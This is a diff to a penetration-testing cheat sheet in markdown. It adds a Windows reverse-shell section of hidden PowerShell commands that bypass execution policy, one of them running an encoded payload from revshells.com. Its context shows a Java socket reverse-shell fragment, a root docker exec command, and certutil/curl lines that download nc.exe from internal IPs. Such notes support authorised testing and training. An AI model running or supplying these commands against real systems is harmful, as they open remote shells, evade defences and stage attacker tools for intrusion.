@@ -379,6 +379,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. ```docker exec -it -u 0 '1ef49e37fb8f'  /bin/bash```
 
 #### Windws Tricks
+##### Reverse shell in windows
+> 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command dir'
+> 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command ipconfig'
+> 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command systeminfo'
+> 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -e <grab encoded payload from revshells.com>'
+
 ##### Download a file in Windows via certutil
 > 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```
 > 1. *Windows 10* ```curl -o nc.exe http://192.168.49.176/nc.exe```
